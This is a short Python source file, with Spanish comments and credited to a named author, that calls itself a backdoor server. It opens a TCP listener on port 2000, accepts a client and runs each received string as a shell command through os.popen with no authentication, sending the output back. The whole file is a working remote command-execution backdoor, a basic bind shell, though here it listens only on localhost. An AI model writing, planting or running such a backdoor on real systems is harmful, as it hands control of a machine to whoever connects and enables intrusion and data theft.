"""
Uso: Backdoor Servidor
Creador: Andrés Hernández Mata
Version: 2.2.0
Python: 3.9.1
Fecha: 08 Abril 2020
"""

import socket
import sys
import os
from colorama import Fore
from colorama import Style

os.system("cls")

servidor = ("127.0.0.1", 2000)
bufferSize = 1024

try:
    TCPServerSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    TCPServerSocket.bind(servidor)
    TCPServerSocket.listen(5)
    print("[+] Iniciado Servidor...")
    while True:    
        cliente, direccion = TCPServerSocket.accept()
        print("[+] Direccion ", direccion)          
        while True:        
            comando = cliente.recv(bufferSize)
            if comando == b"exit":
                cliente.close()
                print("[+] Cerrando Conexion...")            
                print("[+] Saliendo...")
                print("[-] Bye...")            
                sys.exit()                       
            else:
                print("[+] Recibiendo Comando...") 
                comando = comando.decode()    
                salida = os.popen(comando)
                print("[+] Ejecutando " + Fore.GREEN + comando + Style.RESET_ALL)  
                salida = salida.read()
                print("[+] Enviando Resultado...")
                salida = salida.encode()
                cliente.send(salida)    
                print("\n")
                print("[+] Esperando...")    
except Exception:
    print(Fore.RED + "Ocurrio una excepción en la conexion del cliente" + Style.RESET_ALL)

